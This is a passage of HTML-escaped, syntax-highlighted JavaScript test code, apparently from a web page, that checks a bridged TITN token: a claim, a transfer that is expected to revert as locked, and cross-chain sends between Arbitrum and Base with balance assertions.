class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// claim TITN\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimableTitnPerUser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclaimTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// attempt to transfer TITN (spoiler alert: it should fail)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003etry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efail\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;Transaction should have reverted\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ecatch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eerror\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eany\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eerror\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emessage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einclude\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;BridgedTokensTransferLocked\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Minting an initial amount of tokens to ownerA\u0026#39;s address in the TITN contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1000000000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Defining the amount of tokens to send and constructing the parameters for the send operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Defining extra message execution options for the send operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eOptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003enewOptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e().\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddExecutorLzReceiveOption\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e200000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoHex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e().\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = [\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroPad\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fetching the native fee for the token send operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003equoteSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Executing the send operation from TITN contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estartBalanceBOnBase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalBalanceBOnBase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estartBalanceBOnBase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eeql\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalBalanceBOnBase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eeql\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e())\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fetching the native fee for the token send operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = [\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroPad\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003equoteSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estartBalanceBOnArb\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan 